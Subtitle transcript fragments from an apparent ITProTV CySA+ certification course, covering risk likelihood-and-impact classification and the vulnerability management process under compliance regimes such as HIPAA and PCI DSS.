00:17:59.730\nSo how do we categorize things?\n\n362\n00:17:59.730 --> 00:18:04.300\nI can take one, I can look at one threat\nand say, well the likelihood that\n\n363\n00:18:04.300 --> 00:18:09.570\nit would happen is low and\nit's just a very esoteric type of threat.\n\n364\n00:18:09.570 --> 00:18:12.720\nAnd only an extremely educated and\n\n365\n00:18:12.720 --> 00:18:15.970\nskilled attacker would be\nable to exploit it right.\n\n366\n00:18:15.970 --> 00:18:20.400\nSo the likelihood, and\nthose are very few and far between,\n\n367\n00:18:20.400 --> 00:18:24.960\nplus they would have to be\npinpointing my devices specifically.\n\n368\n00:18:24.960 --> 00:18:28.490\nThey would have to be coming after me\nspecifically to even know that I had this\n\n369\n00:18:28.490 --> 00:18:29.990\nas a problem.\n\n370\n00:18:29.990 --> 00:18:33.270\nSo the likelihood of it happening is very,\nvery, low.\n\n371\n00:18:33.270 --> 00:18:39.340\nBut it happens someone does, focus on me,\nfind that that thread is there,\n\n372\n00:18:39.340 --> 00:18:42.960\nhas the skill set available,\nthe impact could be high.\n\n373\n00:18:42.960 --> 00:18:45.570\nBut you'll notice that we\nget medium out of that, so\n\n374\n00:18:45.570 --> 00:18:47.200\nwe would classify it as medium.\n\n375\n00:18:47.200 --> 00:18:49.706\nOr you could say something like, low-high.\n\n376\n00:18:49.706 --> 00:18:52.060\nYou could do a call like that.\n\n377\n00:18:52.060 --> 00:18:56.200\nSo knowing that a likelihood is first, and\nthe second part would be the impact, so\n\n378\n00:18:56.200 --> 00:18:58.000\nI could say low-high.\n\n379\n00:18:58.000 --> 00:19:00.680\nOkay the likelihood is low,\nimpact is high.\n\n380\n00:19:00.680 --> 00:19:01.710\nAnd then on and on you go.\n\n381\n00:19:01.710 --> 00:19:06.090\nSo you wanna build up this classification\nso that you're able to properly evaluate\n\n382\n00:19:06.090 --> 00:19:12.070\nand prioritize the risks that you have\ndiscovered through all the other means.\n\n383\n00:19:12.070 --> 00:19:13.760\nPin testing, vulnerability assessments,\n\n384\n00:19:13.760 --> 00:19:16.730\nthat we have discussed in previous\nepisodes up to this point.\n\n385\n00:19:16.730 --> 00:19:19.250\nSo I can properly categorize them,\nput them in the right place and\n\n386\n00:19:19.250 --> 00:19:22.770\nthen prioritize our remediation\nefforts towards them,.\n\n387\n00:19:22.770 --> 00:19:25.810\n&gt;&gt; Awesome.\n&gt;&gt; I think that that\n\n388\n00:19:25.810 --> 00:19:27.980\nis about it I think that about the only\nother thing that you might need to know\n\n389\n00:19:27.980 --> 00:19:30.650\nabout this is what is\nknown as qualitative risk.\n\n390\n00:19:30.650 --> 00:19:35.930\nOr saying this is the quality of\nthe risk that we have found versus\n\n391\n00:19:35.930 --> 00:19:40.770\nquantitative risk which is a scale\nof numeric value, gives it a value.\n\n392\n00:19:40.770 --> 00:19:44.020\nBut that's basically it when\nit comes to risk evaluation.\n\n393\n00:19:44.020 --> 00:19:46.250\nCheck out this chart,\nlook at other charts as well.\n\n394\n00:19:46.250 --> 00:19:49.755\nAnd see how they can really breakdown\nif you're gonna start getting into risk\n\n395\n00:19:49.755 --> 00:19:55.140\nmanagement and stuff of that nature, as\nyou dive deeper into risk evaluation but\n\n396\n00:19:55.140 --> 00:19:57.170\nrisk is what the name of the game is.\n\n397\n00:19:57.170 --> 00:20:01.490\nThat's why we're doing this is\nbecause there is a risk to our system.\n\n398\n00:20:01.490 --> 00:20:05.600\nAnd we gotta know the depth and\nbreadth of that risk, so\n\n399\n00:20:05.600 --> 00:20:08.380\nthat we can properly prepare and\nmitigate for it.\n\n400\n00:20:08.380 --> 00:20:11.370\nSo I think that's all I've\ngot on risk evaluation.\n\n401\n00:20:11.370 --> 00:20:14.850\nShort topics today, but stuff you\ndo need to now for your CISA exam.\n\n402\n00:20:14.850 --> 00:20:16.960\nSo hopefully you guys are schooled up and\nready to rock for\n\n403\n00:20:16.960 --> 00:20:19.270\nany questions that might\ncome your way on that.\n\n404\n00:20:19.270 --> 00:20:20.450\n&gt;&gt; Wonderful job, Daniel.\n\n405\n00:20:20.450 --> 00:20:23.260\nSecurity practices, training,\nand risk evaluation.\n\n406\n00:20:23.260 --> 00:20:24.460\nAwesome episode.\n\n407\n00:20:24.460 --> 00:20:25.030\nI learned a lot.\n\n408\n00:20:25.030 --> 00:20:27.200\nI always do.\n[LAUGH] Like I said, I pay attention.\n\n409\n00:20:27.200 --> 00:20:28.590\n&gt;&gt; Yeah.\n&gt;&gt; And so, hey, before we leave and\n\n410\n00:20:28.590 --> 00:20:31.320\nbefore we move on,\nany last words as we go forward?\n\n411\n00:20:31.320 --> 00:20:34.630\n&gt;&gt; Definitely make sure that\ndefinitionally, you're solid.\n\n412\n00:20:34.630 --> 00:20:36.075\nCuz you don't wanna get caught.\n\n413\n00:20:36.075 --> 00:20:39.975\nGoing what was, what's the difference\nbetween the technical and operational.\n\n414\n00:20:39.975 --> 00:20:43.175\nI went I can't remember what\ndoes the white team do again?\n\n415\n00:20:43.175 --> 00:20:45.065\nSo make yourself some flashcards.\n\n416\n00:20:45.065 --> 00:20:47.355\nThat's always a great way to\nstudy stuff that's like this,\n\n417\n00:20:47.355 --> 00:20:49.500\nthat's not really tangible,\nit's something that you do.\n\n418\n00:20:49.500 --> 00:20:53.820\nIs something that you even know as\na tangible item inside your brain.\n\n419\n00:20:53.820 --> 00:20:55.300\n&gt;&gt; Great advice, thank you Daniel.\n\n420\n00:20:55.300 --> 00:20:57.840\nAnd Daniel has done a wonderful\njob putting together this site so\n\n421\n00:20:57.840 --> 00:21:00.880\nplus series for you so\nmake sure you see every episode and\n\n422\n00:21:00.880 --> 00:21:04.660\nyou'll be in the course library where\nthere is thousands of hours of content.\n\n423\n00:21:04.660 --> 00:21:06.150\nAnd it's there for one reason.\n\n424\n00:21:06.150 --> 00:21:08.060\nTo help you go further,\nso check that other too.\n\n425\n00:21:08.060 --> 00:21:09.880\nAnd tell everybody you know about ITPROTV.\n\n426\n00:21:09.880 --> 00:21:12.150\nITPROTV is binge worthy.\n\n427\n00:21:12.150 --> 00:21:12.810\nThanks for watching.\n\n428\n00:21:12.810 --> 00:21:13.600\nI'm Zach Memos.\n\n429\n00:21:13.600 -->

00:00:08.172\n[MUSIC]\n\n4\n00:00:08.172 --> 00:00:12.972\n&gt;&gt; You're watching ITPro.TV.\n&gt;&gt; Hello and thank you for\n\n5\n00:00:12.972 --> 00:00:16.066\nwatching ITPro.TV,\nhelping you learn everywhere you go.\n\n6\n00:00:16.066 --> 00:00:19.850\nI'm your host Zach Memos for\nthis episode of CySA+.\n\n7\n00:00:19.850 --> 00:00:23.390\nAnd in this episode,\nit's vulnerability management process.\n\n8\n00:00:23.390 --> 00:00:24.950\nLet me say that again.\n&gt;&gt; [LAUGH]\n\n9\n00:00:24.950 --> 00:00:26.990\n&gt;&gt; Vulnerability management process and\n\n10\n00:00:26.990 --> 00:00:29.180\nDaniel Lowrie is here to show us the way.\n\n11\n00:00:29.180 --> 00:00:31.622\nDanial, good to see you sir.\n&gt;&gt; Good to have me back in the studio with\n\n12\n00:00:31.622 --> 00:00:32.288\nyou Mr. Zach.\n\n13\n00:00:32.288 --> 00:00:33.650\nI appreciate you having me on.\n\n14\n00:00:33.650 --> 00:00:35.630\nI appreciate the good folks out there for\nwatching,\n\n15\n00:00:35.630 --> 00:00:38.168\nhopefully you get a lot of information\nout of this episode at least,\n\n16\n00:00:38.168 --> 00:00:42.126\nthat's my intention, I work really,\nreally hard so be gentle.\n\n17\n00:00:42.126 --> 00:00:45.760\n[LAUGH]\n&gt;&gt; So Daniel, what is information security\n\n18\n00:00:45.760 --> 00:00:47.396\nvulnerability be.\n&gt;&gt; [LAUGH]\n\n19\n00:00:47.396 --> 00:00:48.949\n&gt;&gt; [LAUGH] Let me say it again.\n\n20\n00:00:48.949 --> 00:00:49.515\n&gt;&gt; I know, right,\n\n21\n00:00:49.515 --> 00:00:52.218\nit's a mouthful\n&gt;&gt; Information security vulnerability\n\n22\n00:00:52.218 --> 00:00:55.090\nmanagement process/program,\nwhat is all that?\n\n23\n00:00:55.090 --> 00:00:56.190\n&gt;&gt; All right, so that's a great question.\n\n24\n00:00:56.190 --> 00:01:00.680\nThat's what today's episode is all about\nis identifying what that actually is.\n\n25\n00:01:00.680 --> 00:01:05.790\nBecause when you hear it, Zach, he doesn't\nknow, he's never heard this before.\n\n26\n00:01:05.790 --> 00:01:10.920\nIt can be a bit like, that sounds like\na lot, and it kind of is until you realize\n\n27\n00:01:10.920 --> 00:01:15.350\nit's just, what are we gonna do to\nput in something into place to say,\n\n28\n00:01:15.350 --> 00:01:17.770\nthis is how we secure our systems.\n\n29\n00:01:17.770 --> 00:01:24.672\nHere is how we manage the vulnerabilities\nto our systems, on a daily basis.\n\n30\n00:01:24.672 --> 00:01:27.489\nThis is the program that\nwe're gonna institute,\n\n31\n00:01:27.489 --> 00:01:32.320\nor maybe we're being dictated from\non an high, of what we have to do.\n\n32\n00:01:32.320 --> 00:01:33.520\nCould be that way.\n\n33\n00:01:33.520 --> 00:01:35.670\nAnd we're gonna institute that and\nthat's what we're gonna do.\n\n34\n00:01:35.670 --> 00:01:39.130\nAnd I can say, I followed the law,\nthere it is in black and\n\n35\n00:01:39.130 --> 00:01:41.830\nwhite what I was supposed to do and\nwe've done that.\n\n36\n00:01:41.830 --> 00:01:44.365\nAnd sometimes these things change,\na lot of times they do to be honest with\n\n37\n00:01:44.365 --> 00:01:48.930\nas we learn and progress with\ninformation systems as a whole.\n\n38\n00:01:48.930 --> 00:01:51.650\nWe're able to figure out\na better way to do things.\n\n39\n00:01:51.650 --> 00:01:52.690\nAnd then they might change.\n\n40\n00:01:52.690 --> 00:01:58.560\nBut basically what we're trying to do\nis to define what our work flow is\n\n41\n00:01:58.560 --> 00:02:03.690\non a daily, monthly, weekly, yearly\nbasis to manage the vulnerabilities and\n\n42\n00:02:03.690 --> 00:02:05.910\nrisks inside of our information systems.\n&gt;&gt; So\n\n43\n00:02:05.910 --> 00:02:08.400\nthis is a process based\non best practices and\n\n44\n00:02:08.400 --> 00:02:11.370\ncan change from one enterprise to another.\n&gt;&gt; That's exactly right,\n\n45\n00:02:11.370 --> 00:02:14.950\ndepending on what\nenterprise you might be in.\n\n46\n00:02:14.950 --> 00:02:18.720\nYou might have a different\nset of controls that govern\n\n47\n00:02:18.720 --> 00:02:23.990\nhow you implement your IS vulnerability\nmanagement process or program, okay?\n\n48\n00:02:23.990 --> 00:02:26.690\nAnd that's probably a really\ngood place to start.\n\n49\n00:02:26.690 --> 00:02:28.323\nYes, right, so let's start there.\n\n50\n00:02:28.323 --> 00:02:34.342\nLet's say because there are specific\ntypes of institutions or enterprises or\n\n51\n00:02:34.342 --> 00:02:39.357\nenvironments that you might be in\nthat are dictated from on high,\n\n52\n00:02:39.357 --> 00:02:42.290\nyou must comply in this way.\n\n53\n00:02:42.290 --> 00:02:45.440\nSo this is actually kind of\ninteresting because, well,\n\n54\n00:02:45.440 --> 00:02:46.570\nyou don't have to do it yourself.\n\n55\n00:02:46.570 --> 00:02:48.370\nIt's already laid out.\n\n56\n00:02:48.370 --> 00:02:50.935\nThey give you the check, or\nthe information that you need.\n\n57\n00:02:50.935 --> 00:02:53.988\nYou basically make a checklist out of\nit and you go through check, check,\n\n58\n00:02:53.988 --> 00:02:55.360\ncheck, check, check.\n\n59\n00:02:55.360 --> 00:02:59.600\nNow cool, let's go, just one second here,\nlet me get this out of the way.\n\n60\n00:02:59.600 --> 00:03:04.193\nLet me bring up this IS\nvulnerability management process\n\n61\n00:03:04.193 --> 00:03:07.240\nslide that I've created.\n\n62\n00:03:07.240 --> 00:03:10.666\nThis is the three things that we\nwanna do inside of this process.\n\n63\n00:03:10.666 --> 00:03:11.240\n&gt;&gt; Mh-hm.\n\n64\n00:03:11.240 --> 00:03:12.680\n&gt;&gt; We want to identify,\n\n65\n00:03:12.680 --> 00:03:15.950\nwe're gonna do identification,\nlook for vulnerabilities.\n\n66\n00:03:15.950 --> 00:03:18.360\nWe're gonna prioritize those\nvulnerabilties, right?\n\n67\n00:03:18.360 --> 00:03:20.270\nPrioritization is the next step.\n\n68\n00:03:20.270 --> 00:03:23.380\nSo we're gonna figure out this is the most\ndangerous thing that I need to take care\n\n69\n00:03:23.380 --> 00:03:27.700\nof immediately down to the least dangerous\nthing that can wait a little while.\n\n70\n00:03:27.700 --> 00:03:29.670\nAnd then remediation,\n\n71\n00:03:29.670 --> 00:03:32.300\nI'm going to actually took care\nof the most dangerous thing.\n\n72\n00:03:32.300 --> 00:03:36.000\nAnd now I can move to the second\nmost dangerous thing and so on and\n\n73\n00:03:36.000 --> 00:03:39.910\nso forth,\nhowever the system allows us to do.\n\n74\n00:03:39.910 --> 00:03:43.045\nSo now that brings us back to, you might\nbe in a system where they already have all\n\n75\n00:03:43.045 --> 00:03:44.500\nthis stuff kind of done for you.\n\n76\n00:03:44.500 --> 00:03:47.720\nThese are the things like the healthcare,\nif you're in a financial system,\n\n77\n00:03:47.720 --> 00:03:49.960\nif you're working in government.\n\n78\n00:03:49.960 --> 00:03:52.902\nThey have rules and regulations that\nhave already been put into place so\n\n79\n00:03:52.902 --> 00:03:54.730\nthat you don't have to reinvent the wheel.\n\n80\n00:03:54.730 --> 00:03:57.388\nThey know exactly how they want it and\n\n81\n00:03:57.388 --> 00:04:02.716\nthey just just rain down from on high and\nsay, here is the law, follow it.\n\n82\n00:04:02.716 --> 00:04:04.940\nIf you're in those systems,\nthat's the way it is.\n\n83\n00:04:04.940 --> 00:04:09.970\nSo it might feel like, I don't like to be,\nI think maybe this would be a better way.\n\n84\n00:04:09.970 --> 00:04:12.363\nOr this would be a more\neasy thing to do or\n\n85\n00:04:12.363 --> 00:04:15.870\nthis seems more complicated\nthan it should be.\n\n86\n00:04:15.870 --> 00:04:19.350\nYeah, that can happen,\nyou can feel a little hemmed in and\n\n87\n00:04:19.350 --> 00:04:21.705\nmaybe you do have a better way,\nbut that really doesn't matter.\n\n88\n00:04:21.705 --> 00:04:23.040\nMaybe.you can get that in there, but\n\n89\n00:04:23.040 --> 00:04:26.420\nthe fact of the matter is that\nthese are regulatory, right?\n\n90\n00:04:26.420 --> 00:04:31.040\nThese, [COUGH] different places\nare going to dictate these ways so\n\n91\n00:04:31.040 --> 00:04:36.080\nthat they, and it really keeps us out\nof hot water to be honest with you.\n\n92\n00:04:36.080 --> 00:04:38.601\nIf I am in healthcare and\nI follow HIPAA, right?\n\n93\n00:04:38.601 --> 00:04:42.448\nWhich is the Health Insurance\nPrivatization and Accountability Act,\n\n94\n00:04:42.448 --> 00:04:45.022\nI think it's if I'm,\nand that's a tough one.\n\n95\n00:04:45.022 --> 00:04:45.860\nI gotta be honest with you.\n\n96\n00:04:45.860 --> 00:04:47.500\nI'm gonna look and make sure.\n\n97\n00:04:47.500 --> 00:04:50.742\nHealth Insurance Portability and\nAccountability Act.\n\n98\n00:04:50.742 --> 00:04:51.884\nI never get that one right.\n&gt;&gt; Mm\n\n99\n00:04:51.884 --> 00:04:52.872\n&gt;&gt; [CROSSTALK] It's so\n\n100\n00:04:52.872 --> 00:04:55.781\ntough to remember these giant\nacronyms they throw out.\n\n101\n00:04:55.781 --> 00:04:59.620\nIf I am in healthcare, though,\nI have to abide by HIPAA.\n\n102\n00:04:59.620 --> 00:05:01.790\nNow, if I'm doctor,\nI've got to abide by HIPAA.\n\n103\n00:05:01.790 --> 00:05:03.140\nIf I'm a nurse, I got to abide by HIPAA.\n\n104\n00:05:03.140 --> 00:05:07.700\nIf I'm a secretary at a health clinic,\nI have to abide by HIPAA.\n\n105\n00:05:07.700 --> 00:05:10.519\nAll that data that comes in and\npeople fill out forms, but\n\n106\n00:05:10.519 --> 00:05:14.280\nthat eventually makes its way\ninside of an information system.\n\n107\n00:05:14.280 --> 00:05:18.150\nWhich is then, in turn,\ncontrolled by IT workers,\n\n108\n00:05:18.150 --> 00:05:18.850\nyou and me.\n&gt;&gt; Mm-hm.\n\n109\n00:05:18.850 --> 00:05:19.410\n&gt;&gt; Right, and\n\n110\n00:05:19.410 --> 00:05:25.080\nit's our job to abide by HIPAA to make\nsure that that stuff stays secure.\n\n111\n00:05:25.080 --> 00:05:28.145\nAnd that we're doing vulnerability\nmanagement to make sure that any threat\n\n112\n00:05:28.145 --> 00:05:33.570\nactor that is coming at that system,\nto gain access to that data is mitigated,\n\n113\n00:05:33.570 --> 00:05:37.080\nat least to the extent that\nthe compliance standard has given us.\n\n114\n00:05:37.080 --> 00:05:42.366\nNow, and that's HIPAA,\nwe've also got PCIDSS, you've got GLBA,\n\n115\n00:05:42.366 --> 00:05:46.227\nI mean what is it,\nthe Gramm–Leach–Bliley Act.\n\n116\n00:05:46.227 --> 00:05:49.893\nThat's fun, I think that's for\nfinancial institutions.\n\n117\n00:05:49.893 --> 00:05:50.960\n&gt;&gt; Gramm-Leach-Bliley, eh?\n\n118\n00:05:50.960 --> 00:05:53.549\n[LAUGH]\n&gt;&gt; The old Gramm-Leach-Bliley,\n\n119\n00:05:53.549 --> 00:05:56.920\nyou'd see every time if\nyou're a financial worker.\n\n120\n00:05:56.920 --> 00:05:58.090\nAnd then there's FISMA,\n\n121\n00:05:58.090 --> 00:06:01.240\nwhich is the Federal Information\nSecurity Management Act.\n\n122\n00:06:01.240 --> 00:06:04.522\nSo these are and these are all\nthese acts and regulations and\n\n123\n00:06:04.522 --> 00:06:07.560\ncompliance standards that\nhave been put together.\n\n124\n00:06:07.560 --> 00:06:11.230\nI wanna say other than PCIDSS,\nI believe PCI,\n\n125\n00:06:11.230 --> 00:06:16.770\nwhich is the payment card industry,\nthat's their regulatory set of guidelines.\n\n126\n00:06:16.770 --> 00:06:21.837\nI believe that is kind of an agreed upon\nstandard by the payment card industry.\n\n127\n00:06:21.837 --> 00:06:25.720\nI'm not 100% on that, so I have to do\nmy research, you do your research,\n\n128\n00:06:25.720 --> 00:06:27.420\nmake sure that you check that out.\n\n129\n00:06:27.420 --> 00:06:29.860\nBut I have something in\nmy head that's telling me\n\n130\n00:06:29.860 --> 00:06:33.060\nthat's not a federally dictated thing.\n\n131\n00:06:33.060 --> 00:06:33.570\nBut it might be,\n\n132\n00:06:33.570 --> 00:06:35.780\nI can't remember off the top of my head.\n&gt;&gt; Yeah, and\n\n133\n00:06:35.780 --> 00:06:38.950\nthat's even taking a little bit of\na hit with things like Square and so\n\n134\n00:06:38.950 --> 00:06:42.070\nforth where you can actually attach it to\nyour cell phone and use your cell phone.\n\n135\n00:06:42.070 --> 00:06:44.590\nCuz you're bypassing all\nthose card machines.\n\n136\n00:06:44.590 --> 00:06:45.680\n&gt;&gt; That's exactly right.\n\n137\n00:06:45.680 --> 00:06:49.502\nIf you are a company that takes\ncredit cards as a payment and\n\n138\n00:06:49.502 --> 00:06:52.160\nbecause your insecurity of practices.\n\n139\n00:06:52.160 --> 00:06:56.611\nAnd you're just like a food truck or\nsomething and you're swiping squares with\n\n140\n00:06:56.611 --> 00:07:01.062\na card, or you're a guy in New York City\nselling maps of New York for tourists and\n\n141\n00:07:01.062 --> 00:07:02.880\nsliding with a card.\n\n142\n00:07:02.880 --> 00:07:08.410\nYou should be following the PCIDSS so\nthat you can keep that information secure.\n\n143\n00:07:08.410 --> 00:07:14.660\nPeople are depending on you being,\ndoing your due diligence, security.\n\n144\n00:07:14.660 --> 00:07:16.050\nKeep their information safe.\n\n145\n00:07:16.050 --> 00:07:20.420\nThey're trusting you and every time\nyou slide your card with some vendor,\n\n146\n00:07:20.420 --> 00:07:22.810\nyou're trusting that they\nare following the standards.\n\n147\n00:07:22.810 --> 00:07:27.650\nAnd a lot of times they'll outsource that\nstuff and all they're doing is sliding.\n\n148\n00:07:27.650 --> 00:07:31.870\nAnd when they make an agreement\nwith a company to take payment,\n\n149\n00:07:31.870 --> 00:07:34.490\nthe company itself,\nI think we actually do that.\n\n150\n00:07:34.490 --> 00:07:37.970\nWe don't technically take your\ncard payment at ITPro.TV.\n\n151\n00:07:37.970 --> 00:07:42.230\nWe have a company that we partner with and\nthe partner does all the work so\n\n152\n00:07:42.230 --> 00:07:45.840\nwe don't have to be PCIDSS.\n&gt;&gt; And they're following the guidelines.\n\n153\n00:07:45.840 --> 00:07:47.514\n&gt;&gt; Right, even though we are because by\n\n154\n00:07:47.514 --> 00:07:50.358\nproxy, but we're doing it by proxy,\n&gt;&gt; Right.\n\n155\n00:07:50.358 --> 00:07:52.348\n&gt;&gt; So anybody that takes a car payment\n\n156\n00:07:52.348 --> 00:07:54.132\nthey should be following these\n\n157\n00:07:54.132 --> 00:07:55.341\nregulations.\n&gt;&gt; Right.\n\n158\n00:07:55.341 --> 00:07:57.206\n&gt;&gt; Let's take a look a little bit at just\n\n159\n00:07:57.206 --> 00:08:00.342\nsome of this stuff just so\nyou can kinda see what it looks like.\n\n160\n00:08:00.342 --> 00:08:03.205\nClose this slide, and\nI'll bring my, where is it?\n\n161\n00:08:03.205 --> 00:08:08.521\nThere we go, so here's HIPPA security\nstandards technical safeguards.\n\n162\n00:08:08.521 --> 00:08:12.598\nThis is the portion that we as IT workers\nare gonna wanna be able to follow, and\n\n163\n00:08:12.598 --> 00:08:15.121\nlook at, and\nknow what those regulations are.\n\n164\n00:08:15.121 --> 00:08:19.210\nSo if we work in healthcare, so\nwe can kind of just look through it.\n\n165\n00:08:19.210 --> 00:08:20.221\nDefinitely read through\nthis kind of stuff.\n\n166\n00:08:20.221 --> 00:08:25.811\nThis is at the Health and\nHuman Services, I believe, website.\n\n167\n00:08:25.811 --> 00:08:28.386\nLinks and show notes,\ndon't worry, I'll put them there.\n\n168\n00:08:28.386 --> 00:08:29.261\n&gt;&gt; [LAUGH]\n\n169\n00:08:29.261 --> 00:08:30.999\n&gt;&gt; So if you are sitting there scrambling\n\n170\n00:08:30.999 --> 00:08:32.596\nto write down this massive URL.\n\n171\n00:08:32.596 --> 00:08:34.506\nNo, don't get off that page.\n&gt;&gt; [LAUGH]\n\n172\n00:08:34.506 --> 00:08:35.797\n&gt;&gt; No, no, no, don't worry,\n\n173\n00:08:35.797 --> 00:08:36.581\nit'll be there.\n\n174\n00:08:36.581 --> 00:08:37.915\nWhat is security series?\n\n175\n00:08:37.915 --> 00:08:40.457\nThis gives you compliance deadlines so\n\n176\n00:08:40.457 --> 00:08:43.929\nwhen it had to of been acted\nwith the background of it.\n\n177\n00:08:43.929 --> 00:08:47.400\nAnd what are technical safeguards?\n\n178\n00:08:47.400 --> 00:08:48.851\nGiving the access controls.\n\n179\n00:08:48.851 --> 00:08:53.619\nSecurity rule defines access in\nsubsection 164.304 as the ability or\n\n180\n00:08:53.619 --> 00:08:58.530\nmeans necessary to read-write, modify,\nor communicate data information or\n\n181\n00:08:58.530 --> 00:09:00.821\notherwise use any system resource.\n\n182\n00:09:00.821 --> 00:09:05.122\nThis definition applies to access as used\nin the subpart blah blah blah blah, and\n\n183\n00:09:05.122 --> 00:09:06.271\noff it goes, right?\n\n184\n00:09:06.271 --> 00:09:07.771\nSo here's the regulations.\n\n185\n00:09:07.771 --> 00:09:09.751\nSo if I'm in healthcare,\nI need to know this.\n\n186\n00:09:09.751 --> 00:09:12.135\nI need to be able to, and\nI think there's checklists and\n\n187\n00:09:12.135 --> 00:09:14.180\nstuff that you can download\nfrom the Internet.\n\n188\n00:09:14.180 --> 00:09:16.561\nAnd so you don't have to,\nagain, reinvent the wheel.\n\n189\n00:09:16.561 --> 00:09:17.694\nPeople have done this before you.\n\n190\n00:09:17.694 --> 00:09:21.630\nBut, if you are in that industry,\nyou need to be familiar with this and\n\n191\n00:09:21.630 --> 00:09:23.252\nwhat those safeguards are.\n\n192\n00:09:23.252 --> 00:09:27.352\nAs you create your program,\nhow do I manage vulnerability?\n\n193\n00:09:27.352 --> 00:09:30.901\nWell they tell you, do it x, y and z way.\n\n194\n00:09:30.901 --> 00:09:35.169\nThere is, this intestible but\nit's interesting information for\n\n195\n00:09:35.169 --> 00:09:36.320\nyou as a learner.\n\n196\n00:09:38.070 --> 00:09:40.680\nI don't want you to get a false sense\nof security because you're following\n\n197\n00:09:40.680 --> 00:09:41.184\ncompliance.\n\n198\n00:09:41.184 --> 00:09:42.781\nAnd a lot of people do.\n\n199\n00:09:42.781 --> 00:09:45.311\nThey think I'm compliant, I use HIPAA,\n\n200\n00:09:45.311 --> 00:09:48.502\nI follow the compliance\nstandards inside of HIPAA.\n\n201\n00:09:48.502 --> 00:09:50.355\nTherefore, I'm secure.\n\n202\n00:09:50.355 --> 00:09:55.282\nNot necessarily, you're compliant,\nbut not necessarily secure.\n\n203\n00:09:55.282 --> 00:09:59.053\nSo just because you're following all the\nthings that they tell you to do doesn't\n\n204\n00:09:59.053 --> 00:10:01.222\nnecessarily mean that you're fully secure.\n\n205\n00:10:01.222 --> 00:10:04.218\nYou still need to be doing things\nlike penetration testing, and\n\n206\n00:10:04.218 --> 00:10:06.891\nthen the other techniques\nthat we've looked at before.\n\n207\n00:10:06.891 --> 00:10:10.847\nAnd having human eyes,\nhaving a red team go over this stuff,\n\n208\n00:10:10.847 --> 00:10:13.966\nbecause a scanner's only gonna get you so\nfar.\n\n209\n00:10:13.966 --> 00:10:15.507\nJust cuz you found all the red and\n\n210\n00:10:15.507 --> 00:10:18.781\nyou mitigated it doesn't mean\nthere's not other ways in, right?\n\n211\n00:10:18.781 --> 00:10:20.848\nSo when you look at a scan report and\nyou see red,\n\n212\n00:10:20.848 --> 00:10:24.441\ntypically that means it's the highest\ncriticality, a vulnerability problem.\n\n213\n00:10:24.441 --> 00:10:28.478\nAnd that's what you gotta force now, all\nthe red is gone, yay, and I'm compliant,\n\n214\n00:10:28.478 --> 00:10:29.390\nwe're good to go.\n\n215\n00:10:29.390 --> 00:10:32.843\nYou still wanna be performing\nthings like penetration testing so\n\n216\n00:10:32.843 --> 00:10:34.922\nthat nothing slip through the cracks.\n\n217\n00:10:34.922 --> 00:10:38.154\nCuz vulnerability of the scanners are only\ngood as the day you ran them, and\n\n218\n00:10:38.154 --> 00:10:40.784\nthe next day they could be\noutdated completely, all right?\n\n219\n00:10:40.784 --> 00:10:45.657\nSo don't get lured into a false sense\nof security because you are compliant.\n\n220\n00:10:45.657 --> 00:10:49.862\nIt's good to be compliant, but\nit doesn't mean you're secure you have for\n\n221\n00:10:49.862 --> 00:10:53.093\nthe things that you need to do\nto make sure you're secure.\n\n222\n00:10:53.093 --> 00:10:56.262\nLet's look at some other\nones really quickly.\n\n223\n00:10:56.262 --> 00:11:00.178\nThis is a PCI DSS section\n11.2 is specifically one of\n\n224\n00:11:00.178 --> 00:11:03.676\nthe areas you're gonna want\nto take a look at, and\n\n225\n00:11:03.676 --> 00:11:09.362\nbasically telling you how to create your\nIS vulnerability management process.\n\n226\n00:11:09.362 --> 00:11:12.939\nRun internal and external network\nvulnerability scans at least quarterly,\n\n227\n00:11:12.939 --> 00:11:15.760\nand after any significant\nchange in the network.\n\n228\n00:11:15.760 --> 00:11:19.150\nSo it's giving you guidelines,\nwhen should I be doing my scanning for\n\n229\n00:11:19.150 --> 00:11:21.691\nvulnerabilities so\nthat I can perform mitigation?\n\n230\n00:11:21.691 --> 00:11:25.964\nAnd then how should I perform,\nhow often should I be doing these things?\n\n231\n00:11:25.964 --> 00:11:29.390\nIf a change is made, you should perform\nanother one because changes means\n\n232\n00:11:29.390 --> 00:11:32.163\neverything you just scanned\nis now different, all right?\n\n233\n00:11:32.163 --> 00:11:36.751\nSo very good, I actually find this to be\na very helpful document to be honest with\n\n234\n00:11:36.751 --> 00:11:38.672\nyou for setting these things up.\n\n235\n00:11:38.672 --> 00:11:41.010\nAnd even if your not in PCI,\n\n236\n00:11:41.010 --> 00:11:46.010\nit can help you create your own\nif you had to do that, okay?\n\n237\n00:11:46.010 --> 00:11:48.631\nSo, multiple scan reports can be combined,\nthere we go.\n\n238\n00:11:48.631 --> 00:11:51.924\nExamine scan reports, and supporting\ndocumentation to verify the internal\n\n239\n00:11:51.924 --> 00:11:54.414\nexternal vulnerability scans\nare performed as follows.\n\n240\n00:11:54.414 --> 00:11:59.727\nAnd there's subsections for that, giving\nyou a very nice framework to follow for\n\n241\n00:11:59.727 --> 00:12:02.120\nvulnerability management, okay?\n\n242\n00:12:02.120 --> 00:12:03.382\nLet's see here, which one is this?\n\n243\n00:12:03.382 --> 00:12:06.221\nThis one is the Gramm-Leach-Bliley Act.\n\n244\n00:12:06.221 --> 00:12:07.912\nThere's a lot in that, I'm not gonna lie.\n\n245\n00:12:07.912 --> 00:12:12.358\nI couldn't sift through it quickly enough\nto, and I know it looks a little small,\n\n246\n00:12:12.358 --> 00:12:13.526\nbut I'll blow it up.\n\n247\n00:12:13.526 --> 00:12:18.598\nThere we go, even still small, but yeah,\nyou're gonna have to siphon through\n\n248\n00:12:18.598 --> 00:12:24.142\nall these different subsections and figure\nout which one is the tech document number.\n\n249\n00:12:24.142 --> 00:12:27.182\nI can't remember what section\noff the top of my head it is.\n\n250\n00:12:27.182 --> 00:12:28.321\nBut it's in here.\n\n251\n00:12:28.321 --> 00:12:31.694\nIt's giving you table of contents or\na categorization feel, so\n\n252\n00:12:31.694 --> 00:12:33.067\njust find the right one and\n\n253\n00:12:33.067 --> 00:12:37.119\nyou'll be able to move through it.\n&gt;&gt; And I like what you said too because\n\n254\n00:12:37.119 --> 00:12:41.683\njust being compliant with these\nprocedures doesn't ensure security.\n\n255\n00:12:41.683 --> 00:12:43.364\nSo you need to go the next step,\n\n256\n00:12:43.364 --> 00:12:45.700\nyou need do the penetration testing.\n&gt;&gt; Correct.\n\n257\n00:12:45.700 --> 00:12:46.595\n&gt;&gt; You need to follow\n\n258\n00:12:46.595 --> 00:12:49.681\nyour own security practices.\n&gt;&gt; That's exactly right.\n\n259\n00:12:49.681 --> 00:12:57.492\nLast one 